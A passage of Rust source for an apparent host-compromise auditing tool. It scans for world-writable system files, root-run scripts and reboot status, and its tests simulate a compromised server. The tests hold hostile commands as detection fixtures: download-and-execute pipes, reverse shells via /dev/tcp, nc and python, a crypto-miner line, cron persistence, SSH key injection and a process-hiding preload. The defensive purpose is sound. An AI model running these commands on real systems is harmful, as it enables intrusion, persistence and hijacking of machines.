        (mode & 0o002 != 0 && !(meta.is_dir() && mode & 0o1000 != 0)).then_some(meta)
    };

    for dir in PATH_DIRS {
        if world(&options.path(dir)).is_some() {
            out.push(Writable {
                path: dir.to_string(),
                reason: "path_dir".into(),
                by: "everyone".into(),
                used_by: None,
            });
        }
    }

    let mut files: Vec<PathBuf> = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/etc/crontab",
        "/etc/ld.so.preload",
        "/etc/rc.local",
        "/etc/profile",
    ]
    .iter()
    .map(|f| options.path(f))
    .collect();
    for dir in [
        "/etc/cron.d",
        "/etc/sudoers.d",
        "/etc/systemd/system",
        "/etc/profile.d",
        "/etc/cron.daily",
        "/etc/cron.hourly",
    ] {
        files.extend(
            std::fs::read_dir(options.path(dir))
                .into_iter()
                .flatten()
                .flatten()
                .map(|e| e.path())
                .filter(|p| p.is_file()),
        );
    }
    for file in files {
        if world(&file).is_some() {
            out.push(Writable {
                path: options.display(&file),
                reason: "system_file".into(),
                by: "everyone".into(),
                used_by: None,
            });
        }
    }

    // A script root runs is root's to change, nobody else's.
    let mut checked = BTreeSet::new();
    for (command, source) in runs_as_root {
        for program in executed(command) {
            if !program.starts_with('/')
                || program.starts_with("/proc/")
                || !checked.insert(program.clone())
            {
                continue;
            }
            let path = options.path(&program);
            let Ok(meta) = std::fs::metadata(&path) else {
                continue;
            };
            if !meta.is_file() {
                continue;
            }
            let by = if world(&path).is_some() {
                "everyone".to_string()
            } else if meta.uid() != 0 {
                names
                    .get(&meta.uid())
                    .cloned()
                    .unwrap_or_else(|| meta.uid().to_string())
            } else {
                continue;
            };
            out.push(Writable {
                path: clip(&program, 300),
                reason: "root_script".into(),
                by,
                used_by: Some(clip(source, 300)),
            });
        }
    }

    out.truncate(100);
    out
}

fn reboot(options: &Options) -> Reboot {
    let required = options.path("/var/run/reboot-required").exists()
        || options.path("/run/reboot-required").exists();
    let packages = util::read_limited(&options.path("/var/run/reboot-required.pkgs"), 64 * 1024)
        .or_else(|| util::read_limited(&options.path("/run/reboot-required.pkgs"), 64 * 1024))
        .map(|t| {
            t.lines()
                .map(str::trim)
                .filter(|l| !l.is_empty())
                .map(|l| clip(l, 80))
                .collect::<BTreeSet<_>>()
                .into_iter()
                .take(30)
                .collect()
        })
        .unwrap_or_default();
    let running = std::fs::read_to_string(options.proc.join("sys/kernel/osrelease"))
        .ok()
        .map(|s| s.trim().to_string());
    let newest = std::fs::read_dir(options.path("/boot"))
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            e.file_name()
                .to_string_lossy()
                .strip_prefix("vmlinuz-")
                .map(str::to_string)
        })
        .filter(|v| !v.contains("rescue"))
        .max_by(|a, b| compare_versions(a, b));

    Reboot {
        required,
        packages,
        running_kernel: running,
        newest_kernel: newest,
    }
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::PermissionsExt;
    use std::time::Duration;

    use super::*;

    fn write(root: &Path, path: &str, text: &str) -> PathBuf {
        let full = root.join(path.trim_start_matches('/'));
        std::fs::create_dir_all(full.parent().unwrap()).unwrap();
        std::fs::write(&full, text).unwrap();
        full
    }

    fn chmod(path: &Path, mode: u32) {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap();
    }

    fn options(root: &Path) -> Options {
        Options {
            root: root.to_path_buf(),
            proc: root.join("proc"),
            docker_socket: None,
            apps_dir: None,
            commands: false,
            budget: Duration::from_secs(30),
        }
    }

    #[test]
    fn spots_attacks_in_commands() {
        assert_eq!(
            reasons("curl -fsSL http://1.2.3.4/x.sh | sh"),
            vec!["download_exec"]
        );
        assert_eq!(
            reasons("wget -q -O - http://evil/x | sudo bash -s"),
            vec!["download_exec"]
        );
        assert_eq!(
            reasons("bash -c \"$(curl -s http://evil/i)\""),
            vec!["download_exec"]
        );
        assert_eq!(
            reasons("echo ZWNobyBoaQ== | base64 -d | bash"),
            vec!["decode_exec"]
        );
        assert_eq!(
            reasons("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"),
            vec!["reverse_shell"]
        );
        assert_eq!(
            reasons("nc -e /bin/sh 203.0.113.9 4444"),
            vec!["reverse_shell"]
        );
        assert_eq!(
            reasons(
                "python3 -c 'import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)'"
            ),
            vec!["reverse_shell"]
        );
        assert_eq!(
            reasons("/tmp/.x/xmrig --donate-level 1 -o pool.supportxmr.com:443"),
            vec!["miner", "temp_path"]
        );
        assert_eq!(reasons("/dev/shm/kworker"), vec!["temp_path"]);
        assert_eq!(reasons("cd /tmp && ./run"), vec!["temp_path"]);
        assert_eq!(reasons("sh /var/tmp/up.sh"), vec!["temp_path"]);
        assert_eq!(reasons("/usr/lib/.cache/sshd -D"), vec!["hidden_path"]);
        assert_eq!(
            reasons("(crontab -l; echo '* * * * * /usr/bin/x') | crontab -"),
            vec!["persistence"]
        );
        assert_eq!(
            reasons("echo ssh-rsa AAAA >> /root/.ssh/authorized_keys"),
            vec!["ssh_key_write"]
        );
        assert_eq!(reasons("chattr +i /etc/cron.d/x"), vec!["anti_forensics"]);
    }

    #[test]
    fn ordinary_commands_are_fine() {
        for command in [
            "/usr/local/bin/backup.sh >> /tmp/backup.log 2>&1",
            "cd /var/www/app && php artisan schedule:run >> /dev/null 2>&1",
            "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
            "curl -fsS -m 10 --retry 5 -o /dev/null https://hc-ping.com/abc",
            "/home/deploy/.nvm/versions/node/v20.0.0/bin/node /home/deploy/app/server.js",
            "[ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi",
            "/usr/bin/certbot -q renew --deploy-hook 'systemctl reload nginx'",
            "pg_dump shop | gzip > /var/backups/shop.sql.gz",
            "export PATH=\"$HOME/.local/bin:$PATH\"",
            "[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"",
        ] {
            assert!(reasons(command).is_empty(), "{command}: {:?}", reasons(command));
        }
    }

    #[test]
    fn reads_cron_lines() {
        assert_eq!(
            cron_line("*/5 * * * * root /usr/bin/x --a=b", true),
            Some((Some("root".into()), "/usr/bin/x --a=b".into()))
        );
        assert_eq!(
            cron_line("@reboot /tmp/x", false),
            Some((None, "/tmp/x".into()))
        );
        assert_eq!(cron_line("SHELL=/bin/sh", true), None);
        assert_eq!(cron_line("# 0 0 * * * root x", true), None);
        // A command with = in it is still a job (the inventory's parser drops these).
        assert_eq!(
            cron_line("* * * * * echo aGk= | base64 -d | sh", false),
            Some((None, "echo aGk= | base64 -d | sh".into()))
        );
    }

    #[test]
    fn fingerprints_keys() {
        let key = parse_key("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEN0SgdIFGbOsQAzPU6tMFDlqcWG9WXqxL6b/l4MiUcg dylan@laptop").unwrap();
        assert_eq!(key.kind, "ssh-ed25519");
        // What `ssh-keygen -lf` prints for it.
        assert_eq!(
            key.fingerprint,
            "SHA256:wiUclTj5wWPzqoZ8XNN4y6Jj1SR7OAJSCVrwU2rMtus"
        );
        assert_eq!(key.comment, "dylan@laptop");
        assert!(!key.restricted);
        let restricted = parse_key("command=\"/usr/bin/rrsync /backups\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEN0SgdIFGbOsQAzPU6tMFDlqcWG9WXqxL6b/l4MiUcg backup").unwrap();
        assert!(restricted.restricted);
        assert_eq!(restricted.fingerprint, key.fingerprint);
        assert!(parse_key("# comment").is_none());
        assert!(parse_key("ssh-rsa not-base64!!").is_none());
    }

    #[test]
    fn audits_a_compromised_machine() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        write(root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/bash\npostgres:x:114:120::/var/lib/postgresql:/bin/bash\ndeploy:x:1000:1000::/home/deploy:/bin/bash\nnobody:x:65534:65534::/nonexistent:/usr/sbin/nologin\n");
        write(root, "/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n*/2 * * * * root /opt/scripts/backup.sh\n");
        write(
            root,
            "/etc/cron.d/sysupdate",
            "* * * * * root curl -fsSL http://203.0.113.9/up.sh | sh\n",
        );
        write(
            root,
            "/var/spool/cron/crontabs/www-data",
            "@reboot /tmp/.ICE-unix/kswapd --donate-level 1\n",
        );
        write(
            root,
            "/etc/cron.daily/logrotate",
            "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n",
        );
        write(
            root,
            "/etc/systemd/system/nginx.service",
            "[Service]\nExecStart=/usr/sbin/nginx\n",
        );
        write(root, "/etc/systemd/system/dbus-helper.service", "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.9/443 0>&1'\nRestart=always\n");
        write(
            root,
            "/etc/profile.d/proxy.sh",
            "export http_proxy=http://proxy:3128\n",
        );
        write(root, "/root/.bashrc", "alias ll='ls -l'\n");
        write(
            root,
            "/home/deploy/.bashrc",
            "wget -qO- http://evil/k | bash\n",
        );
        let backup = write(root, "/opt/scripts/backup.sh", "#!/bin/sh\n");
        chmod(&backup, 0o777);
        write(
            root,
            "/etc/ld.so.preload",
            "/usr/local/lib/libprocesshider.so\n",
        );
        write(root, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEN0SgdIFGbOsQAzPU6tMFDlqcWG9WXqxL6b/l4MiUcg dylan@laptop\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC7 attacker\n");
        write(
            root,
            "/var/www/.ssh/authorized_keys",
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEN0SgdIFGbOsQAzPU6tMFDlqcWG9WXqxL6b/l4MiUcg x\n",
        );
        let shell = write(root, "/tmp/.x/bash", "");
        chmod(&shell, 0o4755);
        let odd = write(root, "/usr/local/bin/helper", "");
        chmod(&odd, 0o4755);
        let sudo = write(root, "/usr/bin/sudo", "");
        chmod(&sudo, 0o4755);
        write(root, "/var/run/reboot-required", "");
        write(
            root,
            "/var/run/reboot-required.pkgs",
            "linux-base\nlibc6\nlibc6\n",
        );
        write(root, "/proc/sys/kernel/osrelease", "6.8.0-45-generic\n");
        write(root, "/boot/vmlinuz-6.8.0-45-generic", "");
        write(root, "/boot/vmlinuz-6.8.0-47-generic", "");
        // A process pretending to be a kernel thread, and an honest one.
        write(root, "/proc/4242/cmdline", "[kworker/0:2]\0");
        write(root, "/proc/4242/comm", "kworker/0:2\n");
        write(
            root,
            "/proc/4242/status",
            "Name:\tkworker\nUid:\t33\t33\t33\t33\n",
        );
        write(root, "/proc/4243/cmdline", "[kworker/1:0]\x00600\x00");
        write(
            root,
            "/proc/77/cmdline",
            "nginx: master process /usr/sbin/nginx\0",
        );
        write(root, "/proc/77/comm", "nginx\n");

        let host = gather(&options(root), &Deadline::after(Duration::from_secs(30)));
        let found: Vec<(String, String, Vec<String>)> = host
            .suspicious
            .iter()
            .map(|s| (s.kind.clone(), s.source.clone(), s.reasons.clone()))
            .collect();
        assert!(
            found.contains(&(
                "cron".into(),
                "/etc/cron.d/sysupdate".into(),
                vec!["download_exec".into()]
            )),
            "{found:?}"
        );
        assert!(
            found.contains(&(
                "cron".into(),
                "/var/spool/cron/crontabs/www-data".into(),
                vec!["miner".into(), "temp_path".into()]
            )),
            "{found:?}"
        );
        assert!(
            found.contains(&(
                "systemd".into(),
                "/etc/systemd/system/dbus-helper.service".into(),
                vec!["reverse_shell".into()]
            )),
            "{found:?}"
        );
        assert!(
            found.contains(&(
                "profile".into(),
                "/home/deploy/.bashrc".into(),
                vec!["download_exec".into()]
            )),
            "{found:?}"
        );
        assert!(
            found.contains(&(
                "process".into(),
                "pid 4242".into(),
                vec!["fake_kernel_thread".into()]
            )),
            "{found:?}"
        );
        // `exec -a` keeps the arguments after the made-up name.
        assert!(
            found.contains(&(
                "process".into(),
                "pid 4243".into(),
                vec!["fake_kernel_thread".into()]
            )),
            "{found:?}"
        );
        assert!(
            !found
                .iter()
                .any(|f| f.1.contains("nginx") || f.1 == "pid 77" || f.1.contains("logrotate")),
            "{found:?}"
        );
        let ww = host
            .suspicious
            .iter()
            .find(|s| s.source == "/var/spool/cron/crontabs/www-data")
            .unwrap();
        assert_eq!(ww.user.as_deref(), Some("www-data"));
        assert_eq!(
            host.suspicious
                .iter()
                .find(|s| s.source == "pid 4242")
                .unwrap()
                .user
                .as_deref(),
            Some("www-data")
        );

        assert_eq!(host.accounts.extra_root, vec!["toor"]);
        assert_eq!(host.accounts.system_logins, vec!["www-data"]);
        assert!(host.accounts.login_users.contains(&"deploy".to_string()));
        assert_eq!(host.preload, vec!["/usr/local/lib/libprocesshider.so"]);

        let root_keys = host.ssh_keys.iter().find(|k| k.user == "root").unwrap();
        assert_eq!(root_keys.keys.len(), 2);
        assert_eq!(root_keys.keys[1].comment, "attacker");

        let setuid: Vec<(String, String)> = host
            .setuid
            .iter()
            .map(|s| (s.path.clone(), s.reason.clone()))
            .collect();
        assert!(
            setuid.contains(&("/usr/local/bin/helper".into(), "unknown".into())),
            "{setuid:?}"
        );
        assert!(!setuid.iter().any(|s| s.0 == "/usr/bin/sudo"), "{setuid:?}");
        // Owned by whoever runs the test, so not root: still in a place it shouldn't be.
        assert!(setuid.iter().any(|s| s.0 == "/tmp/.x/bash"), "{setuid:?}");

        assert!(
            host.writable
                .iter()
                .any(|w| w.path == "/opt/scripts/backup.sh"
                    && w.reason == "root_script"
                    && w.by == "everyone"
                    && w.used_by.as_deref() == Some("/etc/crontab")),
            "{:?}",
            host.writable
        );

        assert!(host.reboot.required);
        assert_eq!(host.reboot.packages, vec!["libc6", "linux-base"]);
        assert_eq!(
            host.reboot.running_kernel.as_deref(),
            Some("6.8.0-45-generic")
        );
        assert_eq!(
            host.reboot.newest_kernel.as_deref(),
            Some("6.8.0-47-generic")
        );
    }

    #[test]
    #[ignore = "reads this machine"]
    fn audits_this_machine() {
        let host = gather(
            &Options::default(),
            &Deadline::after(Duration::from_secs(60)),
        );
        println!("{}", serde_json::to_string_pretty(&host).unwrap());
    }

    #[test]
    fn executed_programs() {
        assert_eq!(executed("nohup /tmp/x -c y > /tmp/log &"), vec!["/tmp/x"]);
        assert_eq!(
            executed("cd /srv && /usr/bin/a; /opt/b | /usr/bin/c"),
            vec!["/usr/bin/a", "/opt/b", "/usr/bin/c"]
        );
        assert_eq!(
            executed("/bin/sh /opt/run.sh arg"),
            vec!["/bin/sh", "/opt/run.sh"]
        );
        assert!(executed("echo /tmp/x").is_empty());
    }
}
